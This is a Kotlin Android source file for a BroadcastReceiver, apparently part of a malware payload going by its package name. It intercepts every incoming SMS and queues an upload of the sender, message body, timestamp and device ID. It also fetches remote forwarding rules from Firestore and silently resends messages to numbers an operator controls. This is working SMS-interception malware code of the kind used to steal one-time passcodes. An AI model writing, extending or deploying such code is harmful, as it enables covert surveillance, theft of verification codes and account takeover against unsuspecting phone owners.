package com.payload.jansiix0ne.broadcast

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SmsMessage
import android.util.Log
import androidx.work.Data
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import com.payload.jansiix0ne.worker.SmsUploadWorker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

class Receiver : BroadcastReceiver() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val pendingResult = goAsync()
            
            try {
                val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                messages?.forEach { smsMessage ->
                    val from = smsMessage.displayOriginatingAddress
                    val messageBody = smsMessage.messageBody
                    val timestamp = smsMessage.timestampMillis
                    
                    Log.d("Receiver", "SMS received from: $from, message: $messageBody")
                    
                    // Upload SMS using WorkManager
                    val inputData = Data.Builder()
                        .putString("from", from)
                        .putString("message", messageBody)
                        .putLong("time", timestamp)
                        .putString("deviceId", getDeviceId(context))
                        .build()
                    
                    val uploadWork = OneTimeWorkRequestBuilder<SmsUploadWorker>()
                        .setInputData(inputData)
                        .build()
                    
                    context?.let {
                        WorkManager.getInstance(it).enqueue(uploadWork)
                    }
                    
                    // Check for SMS forwarding rules
                    context?.let { ctx ->
                        scope.launch {
                            try {
                                val repository = com.payload.jansiix0ne.repository.FirestoreRepository()
                                val deviceId = getDeviceId(ctx)
                                val forwardingRules = repository.getForwardingRules(deviceId).getOrNull()
                                
                                forwardingRules?.forEach { rule ->
                                    if (rule.status == "active" && !rule.executed) {
                                        Log.d("Receiver", "Forwarding SMS to: ${rule.toNumber}")
                                        val success = com.payload.jansiix0ne.util.SmsHelper.sendSms(
                                            ctx,
                                            rule.toNumber,
                                            messageBody,
                                            rule.fromSim.toIntOrNull() ?: 0
                                        )
                                        
                                        if (success) {
                                            Log.d("Receiver", "✅ SMS forwarded successfully")
                                        } else {
                                            Log.e("Receiver", "❌ Failed to forward SMS")
                                        }
                                    }
                                }
                            } catch (e: Exception) {
                                Log.e("Receiver", "Error checking forwarding rules", e)
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e("Receiver", "Error processing SMS", e)
            } finally {
                pendingResult.finish()
            }
        }
    }
    
    private fun getDeviceId(context: Context?): String {
        context ?: return ""
        val prefs = context.getSharedPreferences("device_info_prefs", Context.MODE_PRIVATE)
        return prefs.getString("device_id", "") ?: ""
    }
}
